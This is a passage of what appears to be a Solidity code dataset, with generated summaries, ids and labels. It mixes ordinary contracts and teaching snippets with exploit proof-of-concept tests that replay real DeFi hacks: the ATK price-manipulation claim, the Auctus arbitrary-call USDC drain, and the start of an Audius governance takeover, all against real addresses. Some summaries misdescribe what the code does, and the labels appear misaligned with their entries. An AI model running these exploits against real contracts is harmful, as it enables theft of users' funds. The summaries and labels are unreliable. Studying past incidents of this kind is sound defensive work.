        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma abicoder v2;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"./RecordInterface.sol\";\nimport \"./UserStorage.sol\";\n\ncontract AppealStorage {\n    OrderInterface private _oSt;\n    RecordInterface private _rSt;\n    UserInterface private _uSt;\n    address recAddr;\n\n    struct Appeal {\n        address user;\n        uint256 appealNo;\n        uint256 orderNo;\n        address witness;\n        address buyer;\n        address seller;\n        uint256 mortgage;\n        uint256 status;\n        uint256 appealTime;\n        uint256 witTakeTime;\n        uint256 obTakeTime;\n        AppealDetail detail;\n    }\n\n    struct AppealDetail {\n        address finalAppealAddr;\n        uint256 updateTime;\n        string witnessReason;\n        uint256 witnessAppealStatus;\n        string observerReason;\n        uint256 witnessHandleTime;\n        uint256 observerHandleTime;\n        address observerAddr;\n        uint256 witnessHandleReward;\n        uint256 observerHandleReward;\n        uint256 witnessHandleCredit;\n        uint256 observerHandleCredit;\n        uint256 witReward;\n        uint256 witSub;\n        uint256 witCreditR;\n        uint256 witCreditS;\n    }\n\n    mapping(uint256 => Appeal) public appeals;\n    mapping(uint256 => uint256) public appealIndex;\n\n    Appeal[] public appealList;\n\n    constructor(\n        address _r,\n        address _o,\n        address _u\n    ) {\n        _rSt = RecordInterface(_r);\n        _oSt = OrderInterface(_o);\n        _uSt = UserInterface(_u);\n        recAddr = _r;\n    }\n\n    modifier onlyWit(uint256 _o) {\n        Appeal memory _al = appeals[_o];\n        require(_al.witness == msg.sender, \"1\");\n        require(_al.buyer != msg.sender && _al.seller != msg.sender, \"2\");\n        _;\n    }\n\n    modifier onlyOb(uint256 _o) {\n        Appeal memory _al = appeals[_o];\n        require(_al.detail.observerAddr == msg.sender, \"1\");\n        require(_al.buyer != msg.sender && _al.seller != msg.sender, \"2\");\n        _;\n    }\n\n    modifier onlyBOS(uint256 _o) {\n        OrderStorage.Order memory _or = _oSt.searchOrder(_o);\n        require(\n            _or.orderDetail.sellerAddr == msg.sender ||\n                _or.orderDetail.buyerAddr == msg.sender,\n            \"1\"\n        );\n        _;\n    }\n\n    function _insert(uint256 _o, uint256 _count) internal {\n        OrderStorage.Order memory _or = _oSt.searchOrder(_o);\n\n        require(appeals[_o].appealNo == uint256(0), \"4\");\n\n        AppealDetail memory _detail = AppealDetail({\n            finalAppealAddr: address(0),\n            updateTime: uint256(0),\n            witnessReason: \"\",\n            observerReason: \"\",\n            witnessAppealStatus: 0,\n            witnessHandleTime: uint256(0),\n            observerHandleTime: uint256(0),\n            observerAddr: address(0),\n            witnessHandleReward: 0,\n            observerHandleReward: 0,\n            witnessHandleCredit: 0,\n            observerHandleCredit: 0,\n            witReward: 0,\n            witSub: 0,\n            witCreditR: 0,\n            witCreditS: 0\n        });\n\n        uint256 _appealNo = block.timestamp;\n\n        Appeal memory _appeal = Appeal({\n            user: msg.sender,\n            appealNo: _appealNo,\n            orderNo: _o,\n            witness: address(0),\n            buyer: _or.orderDetail.buyerAddr,\n            seller: _or.orderDetail.sellerAddr,\n            mortgage: _count,\n            status: 1,\n            appealTime: block.timestamp,\n            witTakeTime: 0,\n            obTakeTime: 0,\n            detail: _detail\n        });\n\n        appeals[_o] = _appeal;\n\n        appealList.push(_appeal);\n        appealIndex[_o] = appealList.length - 1;\n\n        chanT(_or.orderDetail.sellerAddr, _or.orderDetail.buyerAddr, 1, 0);\n    }\n\n    function chanT(\n        address _seller,\n        address _buyer,\n        uint256 _t,\n        uint256 _r\n    ) internal {\n        uint256 _tc = _rSt.getTradeCredit();\n        uint256 _rs = _rSt.getSubTCredit();\n\n        UserStorage.User memory _user = _uSt.searchUser(_seller);\n        UserStorage.TradeStats memory _tr = _user.tradeStats;\n\n        uint256 _c = _user.credit;\n        if (_t == 1) {\n            _tr.tradeTotal = _tr.tradeTotal > 0 ? (_tr.tradeTotal - 1) : 0;\n\n            _c = (_c >= _tc) ? (_c - _tc) : 0;\n        } else if (_t == 2) {\n            _tr.tradeTotal += 1;\n\n            if (_r == 1) {\n                _c += _tc;\n            } else if (_r == 2) {\n                _c = (_c >= _rs) ? (_c - _rs) : 0;\n            }\n        }\n\n        _uSt.updateTradeStats(_seller, _tr, _c);\n\n        UserStorage.User memory _user2 = _uSt.searchUser(_buyer);\n        UserStorage.TradeStats memory _tr2 = _user2.tradeStats;\n        uint256 _c2 = _user2.credit;\n        if (_t == 1) {\n            _tr2.tradeTotal = _tr2.tradeTotal > 0 ? (_tr2.tradeTotal - 1) : 0;\n\n            _c2 = (_c2 >= _tc) ? (_c2 - _tc) : 0;\n        } else if (_t == 2) {\n            _tr2.tradeTotal += 1;\n\n            if (_r == 1) {\n                _c2 = (_c2 >= _rs) ? (_c2 - _rs) : 0;\n            } else if (_r == 2) {\n                _c2 += _tc;\n            }\n        }\n\n        _uSt.updateTradeStats(_buyer, _tr2, _c2);\n    }\n\n    function applyAppeal(uint256 _o) external onlyBOS(_o) {\n        uint256 _fee = _rSt.getAppealFee();\n        _insert(_o, _fee);\n\n        TokenTransfer _tokenTransfer = _rSt.setERC20Address(\"AIR\");\n        _tokenTransfer.transferFrom(msg.sender, recAddr, _fee);\n    }\n\n    function takeWit(uint256 _o) external {\n        Appeal memory _al = appeals[_o];\n\n        require(_al.buyer != msg.sender && _al.seller != msg.sender, \"1\");\n\n        require(_al.witness == address(0), \"2\");\n        require(_al.status == 1, \"3\");\n\n        bool _f = witOrOb(1);\n        require(_f, \"4\");\n\n        _al.witness = msg.sender;\n        _al.witTakeTime = block.timestamp;\n\n        appeals[_o] = _al;\n        appealList[appealIndex[_o]] = _al;\n    }\n\n    function takeOb(uint256 _o) external {\n        Appeal memory _al = appeals[_o];\n\n        require(_al.buyer != msg.sender && _al.seller != msg.sender, \"1\");\n\n        require(_al.status == 4 || _al.status == 5, \"2\");\n        require(_al.detail.observerAddr == address(0), \"3\");\n\n        bool _f = witOrOb(2);\n        require(_f, \"4\");\n\n        _al.detail.observerAddr = msg.sender;\n        _al.obTakeTime = block.timestamp;\n\n        appeals[_o] = _al;\n        appealList[appealIndex[_o]] = _al;\n    }\n\n    function changeHandler(uint256 _o, uint256 _type) external {\n        Appeal memory _al = appeals[_o];\n\n        if (_type == 1) {\n            require(_al.status == 1, \"2\");\n            require(_al.witness != address(0), \"3\");\n            require(block.timestamp - _al.witTakeTime > 24 hours, \"4\");\n\n            _al.witness = address(0);\n            _al.witTakeTime = 0;\n        } else if (_type == 2) {\n            require(_al.status == 4 || _al.status == 5, \"5\");\n            require(_al.detail.observerAddr != address(0), \"6\");\n            require(block.timestamp - _al.obTakeTime > 24 hours, \"7\");\n\n            _al.detail.observerAddr = address(0);\n            _al.obTakeTime = 0;\n        }\n\n        appeals[_o] = _al;\n        appealList[appealIndex[_o]] = _al;\n    }\n\n    function witOrOb(uint256 _f) internal view returns (bool) {\n        UserStorage.User memory _user = _uSt.searchUser(msg.sender);\n        if (_user.userFlag == _f) {\n            return true;\n        }\n        return false;\n    }\n\n    function applyFinal(uint256 _o) external onlyBOS(_o) {\n        Appeal memory _al = appeals[_o];\n\n        require(_al.status == 2 || _al.status == 3, \"1\");\n\n        require(\n            block.timestamp - _al.detail.witnessHandleTime <= 24 hours,\n            \"2\"\n        );\n\n        chanT(_al.seller, _al.buyer, 1, 0);\n\n        uint256 _fee = _rSt.getAppealFeeFinal();\n\n        TokenTransfer _tokenTransfer = _rSt.setERC20Address(\"AIR\");\n        _tokenTransfer.transferFrom(msg.sender, recAddr, _fee);\n\n        if (_al.status == 2) {\n            _al.status = 4;\n        } else if (_al.status == 3) {\n            _al.status = 5;\n        }\n        _al.detail.finalAppealAddr = msg.sender;\n        _al.detail.updateTime = block.timestamp;\n        appeals[_o] = _al;\n        appealList[appealIndex[_o]] = _al;\n    }\n\n    function witnessOpt(\n        uint256 _o,\n        string memory _r,\n        uint256 _s\n    ) external onlyWit(_o) {\n        require(_s == 2 || _s == 3, \"1\");\n        Appeal memory _al = appeals[_o];\n\n        require(_al.status == 1, \"2\");\n        uint256 _fee = _rSt.getAppealFee();\n        uint256 _rcedit = _rSt.getWitnessHandleCredit();\n\n        _al.status = _s;\n        _al.detail.witnessAppealStatus = _s;\n        _al.detail.witnessReason = _r;\n        _al.detail.witnessHandleTime = block.timestamp;\n        _al.detail.witnessHandleReward = _fee;\n        _al.detail.witnessHandleCredit = _rcedit;\n        _al.detail.witReward = _fee;\n        _al.detail.witCreditR = _rcedit;\n\n        _al.detail.updateTime = block.timestamp;\n        appeals[_o] = _al;\n        appealList[appealIndex[_o]] = _al;\n\n        if (_s == 2) {\n            if (_al.user == _al.buyer) {\n                _rSt.subAvaAppeal(_al.seller, _al.buyer, _al, _fee, 1, 0);\n                chanT(_al.seller, _al.buyer, 2, 2);\n            } else if (_al.user == _al.seller) {\n                _rSt.subAvaAppeal(_al.buyer, _al.seller, _al, _fee, 1, 0);\n\n                chanT(_al.seller, _al.buyer, 2, 1);\n            }\n        }\n\n        if (_s == 3) {\n            if (_al.user == _al.buyer) {\n                _rSt.subAvaAppeal(_al.buyer, _al.seller, _al, _fee, 1, 1);\n                chanT(_al.seller, _al.buyer, 2, 1);\n            } else if (_al.user == _al.seller) {\n                _rSt.subAvaAppeal(_al.seller, _al.buyer, _al, _fee, 1, 1);\n                chanT(_al.seller, _al.buyer, 2, 2);\n            }\n        }\n    }\n\n    function observerOpt(\n        uint256 _o,\n        string memory _r,\n        uint256 _s\n    ) external onlyOb(_o) {\n        require(_s == 6 || _s == 7, \"1\");\n        Appeal memory _appeal = appeals[_o];\n\n        require(_appeal.status == 4 || _appeal.status == 5, \"2\");\n        uint256 _fee = _rSt.getAppealFeeFinal();\n        uint256 _rcedit = _rSt.getObserverHandleCredit();\n\n        _appeal.status = _s;\n        _appeal.detail.observerReason = _r;\n        _appeal.detail.observerHandleTime = block.timestamp;\n        _appeal.detail.observerHandleReward = _fee;\n        _appeal.detail.observerHandleCredit = _rcedit;\n\n        uint256 _subWC = _rSt.getSubWitCredit();\n        uint256 _subWF = _rSt.getSubWitFee();\n\n        if (_s == 6) {\n            if (_appeal.user == _appeal.buyer) {\n                _rSt.subAvaAppeal(\n                    _appeal.seller,\n                    _appeal.buyer,\n                    _appeal,\n                    _fee,\n                    2,\n                    0\n                );\n\n                chanT(_appeal.seller, _appeal.buyer, 2, 1);\n                _rSt.subFrozenTotal(_o, _appeal.buyer);\n            } else if (_appeal.user == _appeal.seller) {\n                _rSt.subAvaAppeal(\n                    _appeal.buyer,\n                    _appeal.seller,\n                    _appeal,\n                    _fee,\n                    2,\n                    0\n                );\n\n                chanT(_appeal.seller, _appeal.buyer, 2, 2);\n                _rSt.subFrozenTotal(_o, _appeal.seller);\n            }\n            if (_appeal.detail.witnessAppealStatus == 3) {\n                _appeal.detail.witSub = _subWF;\n                _appeal.detail.witCreditS = _subWC;\n\n                if (_appeal.detail.witnessHandleCredit >= _subWC) {\n                    _appeal.detail.witnessHandleCredit = SafeMath.sub(\n                        _appeal.detail.witnessHandleCredit,\n                        _subWC\n                    );\n                } else {\n                    _appeal.detail.witnessHandleCredit = 0;\n                }\n                _rSt.subWitnessAvailable(_appeal.witness);\n            }\n        }\n\n        if (_s == 7) {\n            if (_appeal.user == _appeal.buyer) {\n                _rSt.subAvaAppeal(\n                    _appeal.buyer,\n                    _appeal.seller,\n                    _appeal,\n                    _fee,\n                    2,\n                    1\n                );\n                chanT(_appeal.seller, _appeal.buyer, 2, 1);\n                _rSt.subFrozenTotal(_o, _appeal.seller);\n            } else if (_appeal.user == _appeal.seller) {\n                _rSt.subAvaAppeal(\n                    _appeal.seller,\n                    _appeal.buyer,\n                    _appeal,\n                    _fee,\n                    2,\n                    1\n                );\n                chanT(_appeal.seller, _appeal.buyer, 2, 2);\n                _rSt.subFrozenTotal(_o, _appeal.buyer);\n            }\n            if (_appeal.detail.witnessAppealStatus == 2) {\n                _appeal.detail.witSub = _subWF;\n                _appeal.detail.witCreditS = _subWC;\n\n                if (_appeal.detail.witnessHandleCredit >= _subWC) {\n                    _appeal.detail.witnessHandleCredit = SafeMath.sub(\n                        _appeal.detail.witnessHandleCredit,\n                        _subWC\n                    );\n                } else {\n                    _appeal.detail.witnessHandleCredit = 0;\n                }\n                _rSt.subWitnessAvailable(_appeal.witness);\n            }\n        }\n\n        _appeal.detail.updateTime = block.timestamp;\n        appeals[_o] = _appeal;\n        appealList[appealIndex[_o]] = _appeal;\n    }\n\n    function searchAppeal(uint256 _o)\n        external\n        view\n        returns (Appeal memory appeal)\n    {\n        return appeals[_o];\n    }\n\n    function searchAppealList() external view returns (Appeal[] memory) {\n        return appealList;\n    }\n}\n",
        "summary": "This is a Smart Contract written in Solidity that handles appeals in a marketplace-like system. It uses several other contracts, such as RecordInterface and UserStorage, to keep track of orders, users, and their details. The main functions of this contract are:\n\n- Inserting a new appeal into the system when a user applies for one.\n- Allowing witnesses and observers to take up appeals and handle them.\n- Changing handlers if necessary, for example if a witness is not taking any action on an appeal.\n- Allowing witnesses and observers to make decisions on appeals and providing rewards and penalties for them.\n- Searching for appeals and appeals list.",
        "id": "52893e3b-1eaf-4516-83bb-c7653166793d",
        "api_seq": "ArrayAndStruct"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ncontract ArrayTypes {\n\n    // \u56fa\u5b9a\u957f\u5ea6 Array\n    uint[8] array1;\n    bytes1[5] array2;\n    address[100] array3;\n\n    // \u53ef\u53d8\u957f\u5ea6 Array\n    uint[] array4;\n    bytes1[] array5;\n    address[] array6;\n    bytes array7;\n\n    // \u521d\u59cb\u5316\u53ef\u53d8\u957f\u5ea6 Array\n    uint[] array8 = new uint[](5);\n    bytes array9 = new bytes(9);\n    //  \u7ed9\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\u8d4b\u503c\n    function initArray() external pure returns(uint[] memory){\n        uint[] memory x = new uint[](3);\n        x[0] = 1;\n        x[1] = 3;\n        x[2] = 4;\n        return(x);\n    }  \n    function arrayPush() public returns(uint[] memory){\n        uint[2] memory a = [uint(1),2];\n        array4 = a;\n        array4.push(3);\n        return array4;\n    }\n}\n\npragma solidity ^0.8.4;\ncontract StructTypes {\n    // \u7ed3\u6784\u4f53 Struct\n    struct Student{\n        uint256 id;\n        uint256 score; \n    }\n    Student student; // \u521d\u59cb\u4e00\u4e2astudent\u7ed3\u6784\u4f53\n    //  \u7ed9\u7ed3\u6784\u4f53\u8d4b\u503c\n    // \u65b9\u6cd51:\u5728\u51fd\u6570\u4e2d\u521b\u5efa\u4e00\u4e2astorage\u7684struct\u5f15\u7528\n    function initStudent1() external{\n        Student storage _student = student; // assign a copy of student\n        _student.id = 11;\n        _student.score = 100;\n    }\n\n     // \u65b9\u6cd52:\u76f4\u63a5\u5f15\u7528\u72b6\u6001\u53d8\u91cf\u7684struct\n    function initStudent2() external{\n        student.id = 1;\n        student.score = 80;\n    }\n    \n    // \u65b9\u6cd53:\u6784\u9020\u51fd\u6570\u5f0f\n    function initStudent3() external {\n        student = Student(3, 90);\n    }\n\n    // \u65b9\u6cd54:key value\n    function initStudent4() external {\n        student = Student({id: 4, score: 60});\n    }\n}\n\npragma solidity ^0.8.4;\ncontract EnumTypes {\n    // \u5c06uint 0\uff0c 1\uff0c 2\u8868\u793a\u4e3aBuy, Hold, Sell\n    enum ActionSet { Buy, Hold, Sell }\n    // \u521b\u5efaenum\u53d8\u91cf action\n    ActionSet action = ActionSet.Buy;\n\n    // enum\u53ef\u4ee5\u548cuint\u663e\u5f0f\u7684\u8f6c\u6362\n    function enumToUint() external view returns(uint){\n        return uint(action);\n    }\n}\n",
        "summary": "This code is a Solidity smart contract example that showcases various array, struct, and enum types. It defines three different contract types - ArrayTypes, StructTypes, and EnumTypes. \n\nArrayTypes contract defines various fixed-length and dynamic-length arrays and includes methods to initialize and manipulate these arrays.\n\nStructTypes contract defines a simple student struct and includes various initialization methods to set struct properties using different approaches.\n\nEnumTypes contract defines a single enum and includes a method to convert the enum value to its equivalent uint value. \n\nOverall, this code provides a basic understanding of how to create and interact with different array, struct, and enum types in Solidity.",
        "id": "20a134ce-9841-4eb2-a5c7-77ec6dd23eec",
        "api_seq": "ArrayLiteralType"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function MyContract() {\n    /* This creates a `TypeError` because uint8[3] memory\n     * can't be converted to uint256[] memory.\n     */\n    // uint[3] memory x = [1, 2, 3];\n\n    // This works, because it's the same common type.\n    uint8[3] memory y = [1, 2, 3];\n\n    // This works, because it's the same common type.\n    uint16[3] memory z = [256, 2, 3];\n  }\n}\n",
        "summary": "This code is a Solidity smart contract that contains a constructor (function MyContract()) that demonstrates the error that occurs when trying to assign an array of type uint8[3] to an array of type uint256[]. The code also demonstrates that assigning an array of type uint8[3] or uint16[3] to an array of the same type works fine.",
        "id": "e946bb76-1614-41f5-8b3e-8c7effe4d229",
        "api_seq": "ArrayRemove"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  uint[] array = [1,2,3];\n\n  function removeAtIndex(uint index) returns (uint[]) {\n    if (index >= array.length) return;\n\n    for (uint i = index; i < array.length-1; i++) {\n      array[i] = array[i+1];\n    }\n\n    array.length--;\n\n    return array;\n  }\n}\n",
        "summary": "This code defines a smart contract called \"MyContract\" in Solidity. It includes an array \"array\" containing three elements: 1, 2, and 3. The contract also has a function called \"removeAtIndex\" which takes an index as an argument and removes the element at that index from the array \"array\". If the index is greater than or equal to the array length, the function returns nothing. If the index is within the bounds of the array, the function loops through each element of the array from the given index to the end, shifting each element left by one. Finally, the function reduces the length of the array by one and returns the modified array.",
        "id": "ac60259c-aeba-411a-8bb4-d37763dd588f",
        "api_seq": "Assembly"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Assembly {\n    function nativeLoops() public returns (uint _r) {\n        for(uint i = 0; i < 10; i++) {\n            _r++;\n        }\n    }\n    \n    function asmLoops() public returns (uint _r) {\n        assembly {\n            let i := 0\n            loop:\n            i := add(i, 1)\n            _r := add(_r, 1)\n            jumpi(loop, lt(i, 10))\n        }\n    }\n\n    function nativeConditional(uint _v) public returns (uint) {\n        if (5 == _v) {\n            return 55;\n        } else if (6 == _v) {\n            return 66;\n        } \n        return 11;\n    }\n    \n    function asmConditional(uint _v) public returns (uint _r) {\n        assembly {\n            switch _v\n            case 5 {\n                _r := 55\n            }\n            case 6 { \n                _r := 66\n            }\n            default {\n                _r := 11\n            }\n        }\n    }\n    \n    function asmReturns(uint _v) public returns (uint) {\n        assembly {\n            let _ptr := add(msize(), 1)\n            mstore(_ptr, _v)\n            return(_ptr, 0x20)\n        }\n    }\n}",
        "summary": "This code contains a contract called \"Assembly\" that contains several functions. The \"nativeLoops\" function uses a Solidity for-loop to iterate 10 times and return the result. The \"asmLoops\" function achieves the same result by using assembly code. \n\nThe \"nativeConditional\" function uses regular if/else statements in Solidity to return a value based on the input parameter _v. The \"asmConditional\" function achieves the same result by using a switch statement in assembly code. \n\nFinally, the \"asmReturns\" function uses assembly code to return a value by storing it in memory and then returning its memory location and size.",
        "id": "223e699e-95cf-4852-9cf6-fe6565d6602a",
        "api_seq": "Assignments"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Assignments {\n    function returnFirstValue(uint a, uint b) returns (uint) {\n        return a;\n    }\n    \n    function caller() public returns (uint) {\n        return returnFirstValue({b:4, a:8});\n    }\n    \n    function returnAllValues(uint a, uint b, uint c) returns (uint, uint, uint) {\n        return (a,b,c);\n    }\n    \n    function callerAll() public returns (uint, uint, uint) {\n        var(x,y,z) = returnAllValues(4,5,6);\n        (x,y) = (y,x);\n        (x,) = returnAllValues(5,10,15);\n        (,z) = returnAllValues(10,20,30);\n        return (x,y,z);\n    }\n}",
        "summary": "This code is a Solidity smart contract with two functions that return values. The first function \"returnFirstValue\" takes two unsigned integers as parameters and returns the first integer. The second function \"returnAllValues\" takes three unsigned integers as parameters and returns a tuple of the three integers. \n\nThe \"caller\" function calls the \"returnFirstValue\" function with the parameters a=8 and b=4 and returns the value of a, which is 8.\n\nThe \"callerAll\" function calls the \"returnAllValues\" function with the parameters 4, 5, and 6 and assigns the returned values to variables x, y, and z. The function then swaps the values of x and y, assigns new values to x and z by making additional calls to \"returnAllValues\" with different parameters, and returns the values of x, y, and z in a tuple.",
        "id": "7c5f8383-6d72-4669-bded-bbe7b5f63fcb",
        "api_seq": "ATK_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1580095325200474112\n// @Contract address\n// https://bscscan.com/tx/0x9e328f77809ea3c01833ec7ed8928edb4f5798c96f302b54fc640a22b3dd1a52 attack\n// https://bscscan.com/tx/0x55983d8701e40353fee90803688170a16424ee702f6b21bb198bb8e7282112cd attack\n// https://bscscan.com/tx/0x601b8ab0c1d51e71796a0df5453ca671ae23de3d5ec9ffd87b9c378504f99c32 profit\n\n// closed-source Contract is design to deposit and claimReward , the calim Function use getPrice() in ASK Token Contract\n// root cause: getPrice() function\n\ncontract ContractTest is DSTest{\n\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 ATK = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);\n    uint swapamount;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 22102838);\n    }\n\n    function testExploit() public{\n\n        address(WBNB).call{value: 2 ether}(\"\");\n        WBNBToUSDT();\n        swapamount = USDT.balanceOf(address(Pair)) - 3 * 1e18;\n        Pair.swap(swapamount, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\n            \"[End] Attacker ATK balance after exploit\",\n            ATK.balanceOf(address(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231)),\n            18\n        );\n    }\n\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        // call claimToken1 function\n        cheats.startPrank(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231);\n        address(0x96bF2E6CC029363B57Ffa5984b943f825D333614).call(abi.encode(bytes4(0x8a809095)));\n        cheats.stopPrank();\n        USDT.transfer(address(Pair), swapamount * 10000 / 9975 + 1000);\n    }\n\n    function WBNBToUSDT() internal {\n        WBNB.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n}",
        "summary": "This code is a Solidity smart contract called ContractTest that has a function called \"testExploit\". When this function is called, it performs a series of actions:\n\n1. Sends 2 ether to the WBNB contract.\n2. Converts WBNB to USDT using the Uniswap Router and stores the amount of USDT.\n3. Swaps a portion of the USDT back into WBNB using the Uniswap Pair contract.\n4. Transfers the swapped WBNB to the attacker's address.\n\nThis code is vulnerable to an attack that is triggered when another smart contract calls the \"pancakeCall\" function. This function executes the \"claimToken1\" function in another contract, and then transfers some USDT to the Uniswap Pair contract. An attacker can exploit this vulnerability by calling the \"pancakeCall\" function and causing the contract to transfer more USDT than it should have.",
        "id": "5cd9cbff-2ae1-497c-bd21-36aad99a33e0",
        "api_seq": "Auctus_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract MockACOToken {\n  function collateral() public view returns (address) {\n    return address(0);\n  }\n\n  function mintToPayable(address account) external payable returns (uint256) {\n    return 1;\n  }\n\n  function balanceOf(address account) public view returns (uint256) {\n    return 1;\n  }\n\n  function approve(address spender, uint256 amount) public returns (bool) {\n    return true;\n  }\n\n  function strikeAsset() public view returns (address) {\n    return address(this);\n  }\n\n  function transfer(address recipient, uint256 amount) public returns (bool) {\n    return true;\n  }\n}\n\ncontract ContractTest is DSTest, MockACOToken {\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IACOWriter acowrite =\n    IACOWriter(payable(0xE7597F774fD0a15A617894dc39d45A28B97AFa4f));\n  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14460635); // fork mainnet at block 14460635\n  }\n\n  function test() public {\n    emit log_named_uint(\n      \"Before exploit, USDC balance of attacker:\",\n      usdc.balanceOf(msg.sender)\n    );\n    acowrite.write{ value: 1 }(\n      address(this),\n      1,\n      address(usdc),\n      abi.encodeWithSelector(\n        bytes4(keccak256(bytes(\"transferFrom(address,address,uint256)\"))),\n        0xCB32033c498b54818e58270F341e5f6a3bce993B,\n        msg.sender,\n        usdc.balanceOf(0xCB32033c498b54818e58270F341e5f6a3bce993B)\n      )\n    );\n    emit log_named_uint(\n      \"After exploit, USDC balance of attacker:\",\n      usdc.balanceOf(msg.sender)\n    );\n  }\n}\n",
        "summary": "The code is an autogenerated testing contract that tests the interaction between a contract `IACOWriter` and two other contracts `IERC20` and `MockACOToken`. The testing contract defines a function called `test()` which transfers USDC tokens from the balance of an address at `0xCB32033c498b54818e58270F341e5f6a3bce993B` to the address calling the `test()` function. The transfer is done by invoking the `write` function of the `IACOWriter` contract with the appropriate parameters. The contract also defines several helper functions to setup the testing environment and log balances before and after the transfer.",
        "id": "0ccc8ed5-0552-45ca-8a22-6984b9475be3",
        "api_seq": "Audius.exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : 704 ETH (~ 1,080,000 US$)\n// Attacker : 0xa0c7bd318d69424603cbf91e9969870f21b8ab4c\n// AttackContract : 0xbdbb5945f252bc3466a319cdcc3ee8056bf2e569\n// Tx1 initialize + ProposalSubmitted + Staked :  https://etherscan.io/tx/0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984\n// Tx2 submitVote : https://etherscan.io/tx/0x3c09c6306b67737227edc24c663462d870e7c2bf39e9ab66877a980c900dd5d5\n// Tx3 evaluateProposal : https://etherscan.io/tx/0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9\n// Tx4 AUDIO/WETH Swap : https://etherscan.io/tx/0x82fc23992c7433fffad0e28a1b8d11211dc4377de83e88088d79f24f4a3f28b3\n\n// @Info\n// Governance Contract (Proxy) : https://etherscan.io/address/0x4deca517d6817b6510798b7328f2314d3003abac#code\n// Governance Contract (Logic) : https://etherscan.io/address/0x1c91af03a390b4c619b444425b3119e553b5b44b#code\n// Stacking Contract (Proxy) : https://etherscan.io/address/0xe6d97b2099f142513be7a2a068be040656ae4591#code\n// Stacking Contract (Logic) : https://etherscan.io/address/0xea10fd3536fce6a5d40d55c790b96df33b26702f#code\n// DelegateManagerV2 (Proxy) : https://etherscan.io/address/0x4d7968ebfd390d5e7926cb3587c39eff2f9fb225#code\n// DelegateManagerV2 (Logic) : https://etherscan.io/address/0xf24aeab628493f82742db68596b532ab8a141057#code\n// UniswapV2 Router 2 : https://etherscan.io/address/0x7a250d5630b4cf539739df2c5dacb4c659f2488d#code\n\n// @NewsTrack\n// Offical Announcement : https://twitter.com/AudiusProject/status/1551000725169180672\n// Offical Post-Mortem : https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22\n// SunSec : https://twitter.com/1nf0s3cpt/status/1551050841146400768\n// Abmedia News : https://abmedia.io/20220724-audius-hacked-by-mal-governance-proposal\n// Beosin Alert : https://twitter.com/BeosinAlert/status/1551041795735408641\n// CertiK Alert : https://twitter.com/CertiKAlert/status/1551020421532770305\n// MistTrack : https://twitter.com/MistTrack_io/status/1551204726661734400\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\naddress constant attacker = 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c;\naddress constant AUDIO = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;\naddress payable constant uniswap = payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\naddress constant governance = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;\naddress constant staking = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;\naddress constant delegatemanager = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;\n\ninterface IGovernence {\n    enum Vote { None, No, Yes }\n    enum Outcome { InProgress, Rejected, ApprovedExecuted, QuorumNotMet, ApprovedExecutionFailed, Evaluating, Vetoed, TargetContractAddressChanged, TargetContractCodeHashChanged }\n    function initialize(address _registryAddress, uint256 _votingPeriod, uint256 _executionDelay, uint256 _votingQuorumPercent, uint16 _maxInProgressProposals, address _guardianAddress) external;\n    function evaluateProposalOutcome(uint256 _proposalId) external returns (Outcome);\n    function submitProposal(bytes32 _targetContractRegistryKey, uint256 _callValue, string calldata _functionSignature, bytes calldata _callData, string calldata _name, string calldata 